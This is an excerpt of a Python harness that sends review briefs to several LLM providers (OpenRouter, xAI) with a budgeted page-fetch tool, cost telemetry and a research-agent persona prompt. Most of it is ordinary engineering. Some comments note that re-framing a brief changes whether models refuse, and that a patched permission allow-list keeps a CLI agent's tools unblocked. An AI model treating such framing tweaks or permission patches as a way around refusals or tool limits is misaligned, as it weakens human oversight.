    `cache/openrouter_model_metadata.json`. So the CLI was a second layer over the same billing,
    and the layer is what failed: 2x2400s timeouts on a 13.5KB strategic brief with zero output
    (T52 corpus-rule panel), an agentic tool surface that had to be fenced (`-t web`,
    `--ignore-rules`, neutral cwd), a Windows argv ceiling on the prompt, and exit 0 on
    provider errors. The direct call has none of those: no argv limit, no tool surface at all,
    per-call token usage in the response, and OpenRouter keeps the stream alive with
    `: OPENROUTER PROCESSING` comment lines while the model reasons, which removes the
    idle-drop risk that makes long blocking calls untrustworthy.

    WEB ACCESS, added 2026-08-06 on Igor's instruction («Про интернет я имел ввиду для Qwen и
    Kimi»). This channel used to be text-only on purpose - pure analysis is where the model
    earned its seat (T51: strongest finding of the round, derived from control flow with nothing
    executed). Search is now a registry flag, `channels.kimi.web`, off by setting enabled:false.

    It is sent as a request-level PLUGIN rather than by appending `:online` to the model id.
    OpenRouter documents the two as exactly equivalent, and the suffix is the worse of the two
    here for one reason: it hides a billable setting inside the model name, where `--set`, the
    printed plan and the diagnostics file all read a model and none of them see a search fee.
    A cost that does not appear in the plan is a cost nobody declined.

    Billing (OpenRouter docs, 2026-08-06): Exa $0.005 per request for up to 10 results, then
    $0.001 per additional result, on the same account as the tokens. Native provider search is
    used when the provider supports it; Moonshot is not on OpenRouter's native-search list, so
    this falls back to Exa.
    """
    prov = OAI_PROVIDERS.get(provider)
    if prov is None:
        return {"channel": name, "ok": False,
                "error": "channels.json gives this channel provider %r, which this version of "
                         "orchestrate.py cannot reach. Known providers: %s."
                         % (provider, ", ".join(sorted(OAI_PROVIDERS)))}
    key = _env_key(prov["key_env"])
    if not key:
        # `name`, not a literal. This function serves every channel on this protocol, and returning
        # a hard-coded "kimi" here made a qwen failure report itself as a kimi failure - the same
        # instance-for-class mistake that this docstring is about, still present three renames on.
        return {"channel": name, "ok": False,
                "error": "%s is not set - this channel needs it. Set it (see INSTALL.md), or run "
                         "with --skip %s." % (prov["key_env"], name)}
    model = model or _registry_default(name, "model", "moonshotai/kimi-k3")
    msgs = []
    if system:
        msgs.append({"role": "system", "content": system})
    msgs.append({"role": "user", "content": brief})
    # max_tokens covers REASONING + answer on OpenRouter reasoning models. Measured T53: a
    # strategic brief drove kimi-k3 to 132,471 reasoning chars, which consumed the whole 32,000
    # budget before one answer token - out_tokens exactly 32000, empty text, no marker. So the
    # ceiling is high and reasoning is capped explicitly, leaving guaranteed answer room.
    #
    # Both knobs come from the registry now, because the two models on this transport need
    # different ones: kimi takes `reasoning.max_tokens` (an explicit cap), qwen3.8-max has
    # `reasoning.mandatory: true` and is steered by `effort` instead. A recommendation to cut
    # qwen to effort=high, on the documented theory that xhigh RESERVES 95% of max_tokens and
    # starves the answer, was tested before it was believed: four arms at a deliberately tiny
    # 2000-token ceiling, including the arm predicted to fail, all returned a complete answer
    # with the end marker. The ratio is a ceiling, not a reservation - so the mitigation is a
    # generous max_tokens, and depth is not traded away for a mechanism nothing demonstrated.
    body = {"model": model, "messages": msgs,
            "max_tokens": max_tokens or 64000,
            "stream": True}
    if prov["depth"] == "reasoning":
        body["reasoning"] = dict(reasoning) if reasoning else {"max_tokens": 24000}
    elif prov["depth"] == "thinking":
        # A registry `reasoning` block is meaningless on this vendor - it has one switch and no
        # ladder. Say so out loud rather than accepting a field that parses and does nothing,
        # which is the `thinking.budget_tokens` mistake this registry already made on Spark.
        body["thinking"] = {"type": "enabled"}
        if reasoning:
            log("  [%s] note: `reasoning` in the registry is ignored on %s - this vendor has a "
                "single on/off thinking switch and no effort ladder" % (name, prov["label"]))
    if prov["usage_request"] == "openrouter":
        body["usage"] = {"include": True}
    else:
        body["stream_options"] = {"include_usage": True}
    native_search = False
    if (web or {}).get("enabled"):
        if prov["search"] == "plugin":
            plug = {"id": "web"}
            for k in ("engine", "max_results", "search_prompt"):
                if web.get(k) is not None:
                    plug[k] = web[k]
            body["plugins"] = [plug]
            log("  [%s] web search ON (%s, max %s results) - billed per search by the provider"
                % (name, plug.get("engine", "provider default"),
                   plug.get("max_results", "provider default")))
        elif prov["search"] == "native_tool":
            native_search = True
            log("  [%s] web search ON (%s native tool - it opens pages itself, so its citations "
                "are page-level, not search excerpts)" % (name, prov["label"]))
    # 🔴 A PAGE-FETCH TOOL, alongside search rather than instead of it. Igor, 2026-08-07: «я думал,
    # ты так же добавишь им инструмент открытия сайта, типа Scrape, как дополнительный инструмент
    # к нативному». He is identifying the exact hole the registry already documented and had left
    # open: the Exa plugin returns 2-4 KB of query-selected EXCERPTS per URL with `[...]` elision
    # markers, so these two channels could be CURRENT but never GROUNDED, and a verbatim quotation
    # from them could splice two disjoint fragments into a sentence no page ever contained. Kimi
    # said so itself in a live round: «I did not have a working page-fetch tool on this channel,
    # so nothing here is [OPENED].»
    #
    # The second payoff is telemetry, and it is arguably the larger one. WE execute the fetch, so
    # for these channels "which URLs did it actually open" stops being an inference and becomes a
    # list - the grounding evidence Codex structurally cannot provide.
    ft = fetch_tool if fetch_tool is not None else {"enabled": True}
    fetch_on = bool((ft or {}).get("enabled"))
    max_rounds = int((ft or {}).get("max_calls") or 8)
    tools = []
    if native_search:
        tools.append(dict(prov["search_tool"]))
    if fetch_on:
        tools.append(FETCH_TOOL_SCHEMA)
        log("  [%s] page-fetch tool ON (up to %d fetches, public web only, %d KB per page)"
            % (name, max_rounds, FETCH_MAX_BYTES // 1000))
    if tools:
        # PROBED 2026-08-08: MiMo accepts a native tool block and a function tool in the same
        # array. They are not alternatives - the native search finds and reads pages on the
        # vendor's side, ours reads a page we can then prove was opened.
        body["tools"] = tools
    headers = {"Authorization": "Bearer " + key, "Content-Type": "application/json"}
    headers.update(prov.get("headers") or {})

    def _stream_once(payload):
        """One streaming completion. Returns (text, reasoning_chars, usage, tool_calls) or raises.

        Tool calls arrive as DELTAS keyed by `index`, with `function.arguments` split across an
        arbitrary number of chunks - assembling them by concatenation per index is the only
        correct reading, and treating any single chunk as a whole call yields JSON that almost
        parses, which is worse than JSON that does not.
        """
        rq = urllib.request.Request(prov["url"],
                                    data=json.dumps(payload).encode("utf-8"), headers=headers)
        parts, rchars, use, calls = [], 0, {}, {}
        with urllib.request.urlopen(rq, timeout=timeout) as resp:
            for raw in resp:
                line = raw.decode("utf-8", "replace").strip()
                if not line or line.startswith(":"):    # ": OPENROUTER PROCESSING" keep-alive
                    continue
                if not line.startswith("data:"):
                    continue
                data = line[5:].strip()
                if data == "[DONE]":
                    break
                try:
                    ev = json.loads(data)
                except ValueError:
                    continue
                if ev.get("usage"):
                    use = ev["usage"]
                # 🔴 A MID-STREAM ERROR ARRIVES WITH HTTP 200 AND WAS BEING DROPPED ON THE FLOOR.
                # Measured 2026-08-08 on the free Nemotron channel: the run came back in 8s with
                # "EMPTY OUTPUT from stream" and no cause, and every subsequent probe of the same
                # body succeeded - so the provider had rejected that one call and said why, in an
                # `error` event this loop never read. The harness then reported the vendor's stated
                # reason as our own generic emptiness, which sends the next person to debug the
                # wrong layer. Free and rate-limited endpoints make this the COMMON failure, not
                # an exotic one. Captured here and surfaced in the channel's error field.
                if ev.get("error"):
                    stream_error.append(ev["error"])
                for ch in ev.get("choices") or []:
                    if ch.get("error"):
                        stream_error.append(ch["error"])
                    delta = ch.get("delta") or {}
                    if delta.get("content"):
                        parts.append(delta["content"])
                    # Reasoning deltas are surfaced under a separate key; count, never print.
                    # Two spellings, because the two vendors disagree: OpenRouter normalises to
                    # `reasoning`, MiMo emits OpenAI's `reasoning_content`. Reading only the first
                    # would report reasoning_chars=None for a channel that reasoned - a metric
                    # quietly reading zero, which is this project's most-repeated defect.
                    for rk in ("reasoning", "reasoning_content"):
                        if delta.get(rk):
                            rchars += len(delta[rk])
                    # Vendor-side citations (MiMo's native search returns url + title + summary
                    # per opened page). Collected but NEVER counted as our own grounding: we did
                    # not open these, the vendor says it did.
                    for an in (delta.get("annotations") or []):
                        u = (an or {}).get("url") or ((an or {}).get("url_citation") or {}).get("url")
                        if u:
                            vendor_cites.append(u)
                    for tc in delta.get("tool_calls") or []:
                        idx = tc.get("index", 0)
                        slot = calls.setdefault(idx, {"id": None, "name": None, "args": []})
                        if tc.get("id"):
                            slot["id"] = tc["id"]
                        fn = tc.get("function") or {}
                        if fn.get("name"):
                            slot["name"] = fn["name"]
                        if fn.get("arguments"):
                            slot["args"].append(fn["arguments"])
        return ("".join(parts), rchars,  use,
                [{"id": v["id"], "name": v["name"], "args": "".join(v["args"])}
                 for _, v in sorted(calls.items())])

    vendor_cites, stream_error = [], []
    text_parts, reasoning_chars, usage = [], 0, {}
    opened, fetch_failures, fetches = [], [], 0
    tried = {}          # url -> first outcome; a repeat is answered, not re-fetched, not charged
    blocked_hosts = {}  # host -> consecutive failures; 2 retires the host for this review
    fetched_bytes = 0   # cumulative page text; the CALL budget does not bound this. See below.
    in_tot = out_tot = 0
    start = time.time()
    try:
        for _round in range(max_rounds + 1):
            chunk, rch, use, calls = _stream_once(body)
            reasoning_chars += rch
            in_tot += (use or {}).get("prompt_tokens") or 0
            out_tot += (use or {}).get("completion_tokens") or 0
            usage = use or usage
            if chunk:
                text_parts.append(chunk)
            if not calls or not fetch_on or fetches >= max_rounds:
                if calls and fetches >= max_rounds:
                    log("  [%s] fetch budget of %d reached; asking for the answer as it stands"
                        % (name, max_rounds))
                    # Tell the model rather than silently dropping its request: an unanswered
                    # tool call leaves it waiting for a result that will never arrive, and the
                    # usual outcome is an empty answer with no marker.
                    body["messages"].append(
                        {"role": "assistant",
                         "content": "", "tool_calls": [
                             {"id": c["id"] or ("call_%d" % i), "type": "function",
                              "function": {"name": c["name"] or "fetch_url",
                                           "arguments": c["args"] or "{}"}}
                             for i, c in enumerate(calls)]})
                    for i, c in enumerate(calls):
                        body["messages"].append(
                            {"role": "tool", "tool_call_id": c["id"] or ("call_%d" % i),
                             "content": "REFUSED: the fetch budget for this review is spent. "
                                        "Answer from what you already have and mark anything "
                                        "unverified."})
                    body.pop("tools", None)      # no more tool rounds; force a final answer
                    continue
                break
            body["messages"].append(
                {"role": "assistant", "content": chunk,
                 "tool_calls": [{"id": c["id"] or ("call_%d" % i), "type": "function",
                                 "function": {"name": c["name"] or "fetch_url",
                                              "arguments": c["args"] or "{}"}}
                                for i, c in enumerate(calls)]})
            for i, c in enumerate(calls):
                try:
                    args = json.loads(c["args"] or "{}")
                except ValueError:
                    args = {}
                url = (args or {}).get("url") or ""
                if c["name"] != "fetch_url":
                    result = "REFUSED: unknown tool %r." % c["name"]
                elif fetches >= max_rounds and url not in tried:
                    # 🔴 MEASURED: the console printed `fetch 9/8`. The budget was checked once
                    # per ROUND, but one assistant turn can emit several tool calls, and every
                    # call in that batch ran. A ceiling tested outside the loop it is meant to
                    # bound is not a ceiling. Checked per CALL now.
                    result = ("REFUSED: the fetch budget for this review (%d) is spent. Answer "
                              "from what you have and mark anything unverified." % max_rounds)
                elif url in tried:
                    # 🔴 MEASURED ON THE FIRST LIVE ROUND, 2026-08-07: qwen spent fetches 6, 7 and
                    # 8 on ONE unreachable URL, re-requesting it verbatim each time. A budget that
                    # counts attempts rather than distinct pages lets a single broken link consume
                    # the whole allowance, and the model has no way to know it is repeating itself
                    # because each refusal looks new. Serve the first outcome again, say plainly
                    # that this is a repeat, and DO NOT spend a fetch on it.
                    result = ("ALREADY TRIED THIS URL in this review - here is the same result, "
                              "and it did not cost you a fetch. Do not request it again; either "
                              "use a different source or say the page could not be opened.\n\n"
                              + tried[url])
                elif blocked_hosts.get(_fetch_host(url), 0) >= 2:
                    # 🔴 SAME CLASS AS THE REPEATED-URL FIX ABOVE, ONE LEVEL UP: a HOST that
                    # refuses automated traffic refuses all of it, so the budget drains a
                    # different URL at a time while the model reads each 403 as news. Measured on
                    # the round-26 legal brief, 2026-08-07: uscis.gov returned 403 to every
                    # request, and it cost qwen 2 fetches and kimi 3 - on the USCIS Policy Manual,
                    # which was one of the primary sources the brief specifically asked for.
                    #
                    # We already send an honest User-Agent and this is NOT an attempt to get past
                    # the refusal: a host that says no has answered. What is fixed is only that
                    # its answer should cost one fetch, not eight, and that the model should be
                    # told to change SOURCE rather than to try the same wall again.
                    result = ("HOST REFUSED EARLIER IN THIS REVIEW (%s). It has already declined "
                              "automated requests here more than once, so this attempt was not "
                              "made and did not cost you a fetch. Do not try this host again. "
                              "Find the same authority somewhere that serves it - for US federal "
                              "law, uscode.house.gov and www.ecfr.gov and www.govinfo.gov all "
                              "work from here - or state plainly that the page could not be "
                              "opened and tag the claim accordingly."
                              % _fetch_host(url))
                elif fetched_bytes >= FETCH_RUN_BUDGET:
                    # 🔴 THE CALL BUDGET WAS THE WRONG UNIT. Eight fetches sounds modest; eight
                    # fetches at the 400 KB per-page ceiling is 3.2 MB of page text, and because
                    # every tool round re-sends the whole conversation the cost is quadratic in
                    # the number of rounds. Measured 2026-08-08: one 400 KB page billed 273 018
                    # input tokens for an 813-character question, and a single round-29 panel run
                    # pulled a 224 KB, a 238 KB and a 386 KB page on three different channels -
                    # so this is the common case, not the tail.
                    #
                    # The per-page ceiling stays where it is on purpose: truncating a long statute
                    # mid-section is a worse failure than an expensive review, and this project
                    # reads statutes. What is bounded here is the TOTAL, which no legitimate
                    # review needs to exceed - 1 MB is roughly 250k tokens of page text, already
                    # more than most briefs plus every source they cite.
                    result = ("PAGE BUDGET SPENT for this review: %d KB of page text has already "
                              "been fetched, which is the ceiling. Further fetches are refused - "
                              "not because the page is unreachable, but because each one is "
                              "re-sent on every later step and the cost grows faster than the "
                              "value. Answer from what you have already read, and say plainly "
                              "which questions you could not settle."
                              % (fetched_bytes // 1000))
                    log("  [%s] page budget spent (%d KB fetched, ceiling %d KB) - refusing "
                        "further fetches. This is OUR limit, not the site's."
                        % (name, fetched_bytes // 1000, FETCH_RUN_BUDGET // 1000))
                else:
                    fetches += 1
                    result = _safe_fetch_url(url)
                    tried[url] = result[:2000] if len(result) > 2000 else result
                    failed = result.startswith(("REFUSED:", "HTTP ", "could not fetch"))
                    if failed:
                        fetch_failures.append(url)
                        h = _fetch_host(url)
                        blocked_hosts[h] = blocked_hosts.get(h, 0) + 1
                    else:
                        opened.append(_norm_url(url))
                        fetched_bytes += len(result)
                    log("  [%s] fetch %d/%d %s -> %s"
                        % (name, fetches, max_rounds, url[:90],
                           result[:70] if failed else "%d chars" % len(result)))
                    # 🔴 A FETCH IS A TOKEN BOMB AND NOTHING SAID SO. Measured 2026-08-08 on
                    # orgemini36flash: one fetch of the npm registry document returned 400 078
                    # chars (the FETCH_MAX_BYTES ceiling), and because every tool round re-sends
                    # the whole conversation, an 813-character question billed 273 018 input
                    # tokens. The page cap was chosen to avoid truncating a long statute; nobody
                    # priced it. It is not lowered here - a truncated statute is a worse failure
                    # than an expensive one - but it is now VISIBLE at the moment it happens,
                    # which is the only point at which a human can still stop the round.
                    if not failed and len(result) > 100_000:
                        log("  [%s] ⚠ that page is %d KB ~= %d k tokens, and every later tool "
                            "round re-sends it. One such fetch has billed >270k input tokens on "
                            "this transport. Lower fetch_tool.max_calls or FETCH_MAX_BYTES if "
                            "this channel is expensive."
                            % (name, len(result) // 1000, len(result) // 4000))
                body["messages"].append({"role": "tool",
                                         "tool_call_id": c["id"] or ("call_%d" % i),
                                         "content": result})
    except urllib.error.HTTPError as e:
        detail = ""
        try:
            detail = e.read().decode("utf-8", "replace")[:300]
        except Exception:
            pass
        return {"channel": name, "ok": False,
                "error": "HTTP %s from OpenRouter: %s" % (e.code, detail)}
    except Exception as e:
        return {"channel": name, "ok": False, "error": "stream failed: %r" % (e,)}
    secs = time.time() - start
    # Only the LAST assistant turn is the review. Earlier turns are the model narrating its
    # tool use ("let me open that page"), and concatenating them would put commentary above the
    # answer and push the end marker off the last line - which the completion check reads as an
    # incomplete review.
    text = text_parts[-1] if text_parts else ""
    if outfile and text.strip():
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(text)
    warn = []
    if marker and not text.strip().endswith(marker):
        warn.append("END MARKER NOT ON LAST LINE - output is partial, do not parse it")
    if not text.strip():
        # Say WHOSE failure it was. An empty answer with a provider message attached is a
        # different problem from an empty answer without one, and only the first tells you
        # whether to retry, change channel, or look at our own code.
        if stream_error:
            e0 = stream_error[0]
            msg = e0.get("message") if isinstance(e0, dict) else str(e0)
            code = e0.get("code") if isinstance(e0, dict) else None
            warn.append("PROVIDER ERROR MID-STREAM (HTTP 200, error event): %s%s"
                        % (msg or e0, (" [code %s]" % code) if code else ""))
        else:
            warn.append("EMPTY OUTPUT from stream, and the provider sent no error event - the "
                        "connection produced no content and gave no reason")
    note = []
    record_refusal(refusal_check(text, marker), warn, note)
    # Tokens are SUMMED across tool rounds, not taken from the last response. Each round re-sends
    # the whole conversation, so the final call's prompt_tokens is only the last leg and reading
    # it as the total under-reports the round - on a fetch-heavy review, by most of the bill.
    n_cited, grounded, _ung = _cite_check(text, set(opened))
    # Vendor-side search telemetry, where the vendor reports any. MiMo returns
    # usage.web_search_usage = {"tool_usage": N, "page_usage": M} - N searches, M pages it opened
    # itself. Kept in a field named for what it counts (`vendor_*`) and NEVER folded into
    # `opened_urls`, which means "pages THIS HARNESS fetched and can prove". Merging the two would
    # manufacture grounding out of the vendor's own assertion, which is the mistake this project
    # already caught once when it called a printed-URL count "grounding".
    wsu = (usage or {}).get("web_search_usage") or {}
    return {"channel": name, "ok": not warn, "text": text, "seconds": round(secs, 1),
            "bytes": len(text.encode("utf-8")), "exit": 0, "model": model,
            "provider": provider,
            "in_tokens": in_tot or usage.get("prompt_tokens"),
            "out_tokens": out_tot or usage.get("completion_tokens"),
            # 🔴 THE PRICE WAS ON THE WIRE ALL ALONG AND WE THREW IT AWAY. `usage.include: true`
            # has been sent on this transport since the channel was built; OpenRouter answers with
            # `cost`, `cost_details` and `prompt_tokens_details.cached_tokens`, and none of it was
            # read. Six metered channels reported tokens and no dollars, so "what did this round
            # cost" was unanswerable for everything except xAI - which we praised for being the
            # only channel that prices its own call. It was not; it was the only one we asked.
            # Found 2026-08-08 by dumping the raw usage object instead of the fields we expected.
            "usd": usage.get("cost"),
            "cached_in_tokens": (usage.get("prompt_tokens_details") or {}).get("cached_tokens"),
            "reasoning_chars": reasoning_chars or None,
            "vendor_searches": wsu.get("tool_usage"),
            "vendor_pages": wsu.get("page_usage"),
            "vendor_citations": len(set(vendor_cites)) or None,
            "provider_error": stream_error[0] if stream_error else None,
            # Real grounding evidence for a channel that had none: WE ran these fetches, so this
            # is a list rather than an inference. Codex cannot produce this at all.
            "fetches": fetches or None,
            # D6: `opened_urls` here really was ours, but it shared a name with the vendor-side
            # count on xai and gemini. Same vocabulary now, so the two can never be added up.
            **_grounding(fetched=opened),
            "fetch_failures": len(fetch_failures) or None,
            "n_cited": n_cited or None,
            "n_grounded": len(grounded) if opened else None,
            "warnings": warn, "notes": note}


XAI_RESPONSES_URL = os.environ.get("XAI_BASE", "https://api.x.ai/v1/responses")


def call_xai_responses(brief, marker, outfile, model=None, system=None, timeout=2400,
                       name="grok420", tools=None, max_tokens=None):
    """
    Grok through xAI's own Agent Tools API - /v1/responses, not /chat/completions.

    🔴 WHY A SEPARATE ENDPOINT, ESTABLISHED BY PROBING AND NOT BY READING (2026-08-08). The
    obvious wiring was chat/completions, which this file already speaks. Measured there:

      * `reasoning_effort` -> HTTP 400 «Model grok-4.20-0309-reasoning does not support parameter
        reasoningEffort». So this model has NO depth knob, and the tier ladder cannot reach it.
        That is recorded rather than faked with a field that parses and does nothing.
      * `tools:[{"type":"web_search"}]` -> 422 «unknown variant `web_search`, expected `function`
        or `live_search`», and then `live_search` -> HTTP 410 «Live search is deprecated. Please
        switch to the Agent Tools API». So chat/completions has NO server-side search at all now,
        and every document describing `search_parameters` is stale.
      * An INVENTED top-level parameter returns 200. The endpoint silently drops what it does not
        recognise, so on this vendor a 200 is not evidence that anything was configured. Every
        claim in this docstring rests on a meter or an error, never on a success.

    What /v1/responses gives that neither chat/completions nor the OpenRouter resale can:

      * `web_search` runs an AGENTIC loop and OPENS PAGES. Measured: action `search`, then two
        `open_page` calls, one of them straight into an article URL. Those URLs are reported, so
        "which pages were read" is a list on this channel, as it is for goog36flash.
      * `x_search` searches X. Nothing else in the panel can see that corpus at all.
      * `url_citation` annotations carry `start_index`/`end_index` into the answer text, so
        "which sentence does this source support" is a lookup rather than a judgement. Only
        goog36flash also does this.
      * `usage.cost_in_usd_ticks` - the vendor's own price for the call. CALIBRATED, not assumed:
        a 2192-token prompt (128 cached) with 1 content + 202 reasoning tokens reported 31 131 000
        ticks, and (2064*$1.25 + 128*$0.20 + 203*$2.50)/1e6 = $0.00311310 = ticks/1e10 exactly.
        So one tick is 1e-10 USD. Note what that calibration also proves: `completion_tokens`
        here EXCLUDES `reasoning_tokens` (2192+1+202 = total 2395), so billed output is the sum.
        Codex reports no cost, Spark reports none, OpenRouter reports none inline - this is the
        only channel in the panel that prices its own call.

    No harness `fetch_url` here, for the same reason goog36flash has none: two fetchers on one
    channel make "who opened this page" ambiguous, and that answer is what this channel is for.
    """
    key = _env_key("XAI_API_KEY")
    if not key:
        return {"channel": name, "ok": False,
                "error": "XAI_API_KEY is not set - this channel needs it. Set it (see "
                         "INSTALL.md), or run with --skip %s." % name}
    model = model or _registry_default(name, "model", "grok-4.20-0309-reasoning")
    tools = list(tools or ["web_search"])
    body = {"model": model,
            # The system layer rides in front of the brief, exactly as it does for codex and agy.
            # A brief framed one way is refused and framed another way is answered, so the framing
            # has to reach every channel that can refuse.
            "input": [{"role": "user", "content": _with_system(brief, system)}],
            "max_output_tokens": max_tokens or 60000,
            "tools": [{"type": t} for t in tools],
            "stream": True}
    headers = {"Authorization": "Bearer " + key, "Content-Type": "application/json"}
    log("  [%s] xAI Agent Tools: %s - the VENDOR opens the pages, so this channel reports "
        "vendor_opened and never fetched_by_us" % (name, ", ".join(tools)))

    text_parts, rchars, resp_obj = [], 0, {}
    start = time.time()
    try:
        rq = urllib.request.Request(XAI_RESPONSES_URL,
                                    data=json.dumps(body).encode("utf-8"), headers=headers)
        with urllib.request.urlopen(rq, timeout=timeout) as resp:
            for raw in resp:
                line = raw.decode("utf-8", "replace").strip()
                if not line.startswith("data:"):
                    continue          # `event:` lines duplicate ev["type"]; keep-alives are blank
                payload = line[5:].strip()
                if payload == "[DONE]":
                    break
                try:
                    ev = json.loads(payload)
                except ValueError:
                    continue
                etype = ev.get("type") or ""
                if etype == "response.output_text.delta":
                    text_parts.append(ev.get("delta") or "")
                elif etype.endswith("reasoning_summary_text.delta"):
                    rchars += len(ev.get("delta") or "")     # count, never print
                elif etype in ("response.completed", "response.incomplete", "response.failed"):
                    resp_obj = ev.get("response") or {}
    except urllib.error.HTTPError as e:
        detail = ""
        try:
            detail = e.read().decode("utf-8", "replace")[:300]
        except Exception:                                    # noqa: BLE001
            pass
        return {"channel": name, "ok": False,
                "error": "HTTP %s from xAI: %s" % (e.code, detail)}
    except Exception as e:                                   # noqa: BLE001
        return {"channel": name, "ok": False, "error": "stream failed: %r" % (e,)}
    secs = time.time() - start

    text = "".join(text_parts)
    usage = resp_obj.get("usage") or {}
    searches, opened, cited = 0, [], []
    for item in (resp_obj.get("output") or []):
        itype = item.get("type") or ""
        if itype.endswith("search_call"):
            act = item.get("action") or {}
            if (act.get("type") or "") == "open_page" and act.get("url"):
                opened.append(_norm_url(act["url"]))
            else:
                searches += 1
        elif itype == "message":
            for part in (item.get("content") or []):
                for an in (part.get("annotations") or []):
                    if an.get("url"):
                        cited.append(_norm_url(an["url"]))
    # Fall back to the streamed text if the terminal event carried none - a truncated stream that
    # still delivered the answer should not be reported as an empty channel.
    if not text.strip():
        for item in (resp_obj.get("output") or []):
            if item.get("type") == "message":
                for part in (item.get("content") or []):
                    if part.get("text"):
                        text_parts.append(part["text"])
        text = "".join(text_parts)
    if outfile and text.strip():
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(text)

    warn, note = [], []
    if marker and not text.strip().endswith(marker):
        warn.append("END MARKER NOT ON LAST LINE - output is partial, do not parse it")
    if not text.strip():
        # 🔴 "EMPTY OUTPUT from stream" AND NOTHING ELSE was all this said until 2026-08-08, and
        # it happened for real in the round-29 panel: 8 456 output tokens, of which 8 453 were
        # reasoning, three server-side tool calls, $0.052 billed, and a zero-byte answer. The
        # warning named the symptom and threw away every fact that could explain it. Whatever
        # the vendor DID report - the terminal status, the incomplete reason, the shape of the
        # output array - now travels with the failure, because a paid failure you cannot
        # diagnose is one you will pay for again.
        kinds = sorted({(it.get("type") or "?") for it in (resp_obj.get("output") or [])})
        warn.append(
            "EMPTY OUTPUT from stream - status=%s, incomplete_reason=%s, output items=%s, "
            "reasoning_tokens=%s of %s output tokens. A high reasoning share with no message "
            "item means the turn ended inside the agentic loop: re-run, or shorten the brief."
            % (resp_obj.get("status"),
               (resp_obj.get("incomplete_details") or {}).get("reason"),
               kinds or "none captured",
               (usage.get("output_tokens_details") or {}).get("reasoning_tokens"),
               usage.get("output_tokens")))
    record_refusal(refusal_check(text, marker), warn, note)
    if resp_obj.get("status") == "incomplete":
        note.append("xAI reported status=incomplete (%s)"
                    % ((resp_obj.get("incomplete_details") or {}).get("reason") or "no reason"))
    n_cited, grounded, _ung = _cite_check(text, set(opened))
    ticks = usage.get("cost_in_usd_ticks")
    out_tok = usage.get("output_tokens")
    reas = (usage.get("output_tokens_details") or {}).get("reasoning_tokens")
    return {"channel": name, "ok": not warn, "text": text, "seconds": round(secs, 1),
            "bytes": len(text.encode("utf-8")), "exit": 0, "model": model,
            "in_tokens": usage.get("input_tokens"),
            "cached_in_tokens": (usage.get("input_tokens_details") or {}).get("cached_tokens"),
            "out_tokens": out_tok,
            "reasoning_tokens": reas,
            "reasoning_chars": rchars or None,
            "searches": searches or None,
            # Vendor-opened, and now NAMED so. Same standing as goog36flash's url_context and
            # agy's stream-json tool log: a structured record of a page the vendor says it read,
            # weaker than holding the bytes ourselves and far stronger than a URL the model
            # merely printed. Until 2026-08-08 this went out as `opened_urls`, the same key the
            # OpenRouter channels used for pages the HARNESS fetched (defect D6).
            **_grounding(vendor_opened=opened),
            "n_vendor_grounded": len(grounded) if opened else None,
            "server_side_tools": usage.get("num_server_side_tools_used"),
            # Kept even on success: "what did the response actually contain" is the first
            # question asked of any xai failure, and reconstructing it after the fact is
            # impossible because the stream is gone.
            "response_status": resp_obj.get("status"),
            "output_item_types": sorted({(it.get("type") or "?")
                                         for it in (resp_obj.get("output") or [])}) or None,
            # 🔴 NOT `num_sources_used`. That counter belongs to the DEPRECATED live-search path
            # and reads 0 forever on this one - it was 0 in every probe that opened three pages.
            # Reporting it would have been a counter named for something it no longer measures,
            # which is this project's most-repeated defect, freshly available in a new API.
            "usd": round(ticks / 1e10, 6) if ticks else None,
            "n_cited": n_cited or None,
            # NOT n_grounded. We fetched nothing on this channel, so there is no harness-side
            # grounding to report and reporting the vendor's as if there were is exactly what
            # D6 was about.
            "n_grounded": None,
            "vendor_citations": len(set(cited)) or None,
            "warnings": warn, "notes": note}


AGY_AGENT = "deep-researcher"   # written into the run's own workspace; see _write_agy_agent

# The persona this channel runs under. It exists because the CLI's own product framing is
# "near-zero overhead, fast local iterations" - correct for coding, wrong for a review, and it
# shows up as a short confident answer with two sources. Naming that default and overriding it
# explicitly measurably raises depth (thinking_tokens 1.5k -> 5.9k on the same brief).
#
# What is NOT in here, deliberately: an instruction to avoid MCP tools. That was tried and
# failed 5/5 - the MCP servers' own tool descriptions ("WHEN TO USE THIS SERVER: URL/Webpage
# Reading...") outrank an agent system prompt, and the model reached for jina every time.
# Permission rules are the only thing that decides tool access. Prose does not.
AGY_AGENT_MD = """---
name: deep-researcher
description: Source-verifying research reviewer. Never answers dated questions from memory.
---

# Deep researcher

You are an independent research and verification agent. You are NOT the author of the material
you are given, and your value comes from what you find wrong in it.

## Why the usual terminal defaults do not apply here

This CLI is tuned for fast local coding iterations: short answers, few tool calls, stop as soon
as the answer looks plausible. That tuning is wrong for this task and does not apply. Here, an
answer that arrives quickly and cites nothing is a failed answer. Length, source count and
explicit uncertainty are the deliverable.

## Protocol - follow in order, do not skip ahead

1. Before searching, write out the list of factual claims that need verification. Dated facts,
   version numbers, prices, legal rules, "current" anything - all need verification.
2. For each claim, search, then OPEN the page. A search snippet is not a source: a claim is
   verified only once you have opened the page it lives on.
3. Do not stop at the first plausible answer. For every important claim look for a second,
   independent confirmation, and deliberately look for a source that contradicts it.
4. Prefer primary sources: the vendor's own documentation, the regulator's own page, the
   official changelog, the statute or rule text, the API reference. Use news, blogs and forums
   only as evidence that a dispute exists, never as proof of a fact.
5. Check recency explicitly. For anything that can change, find the effective date or last
   revision date of the source and say what it is. Distinguish the date a rule was PUBLISHED
   from the date it takes EFFECT - they are different facts and conflating them is a real error.
6. Before concluding, review your findings for contradictions - between sources, and between a
   source and the material under review. Contradictions are the most valuable output; never
   smooth them over.

## Hard rules

- Never answer a dated or checkable question from memory. If you did not open a source for it,
  it is not verified, and you must label it as such.
- If your search finds nothing, write exactly: `my search found no confirmation`. Do NOT
  conclude the thing does not exist. Asserting non-existence requires positive evidence of
  absence, with that source's URL.
- Quote the URL you actually opened. Do not reconstruct a citation from memory afterwards: a
  document number that drifts by one digit is a fabricated citation, and it looks exactly like
  a real one.
- If a tool you need is unavailable or denied, say so explicitly and name it. Never quietly
  fall back to answering from memory.

## Required output shape

End with an evidence table, one row per checkable claim:

| claim | source URL | source date | verdict (confirmed / contradicted / not found) | what it changes |

Then a short section "What I could not verify and why".
Then the literal end marker you were given. If you were given none, end with RESEARCH-COMPLETE.
"""


def agy_permission_preflight():
    """
    Answer "will this channel be able to finish?" in milliseconds, instead of finding out after
    a 25-minute run comes back empty. Checks that the allow-rules patch is still in place -
    settings.json is a user file and can be reverted, rewritten by the TUI, or lost on reinstall.
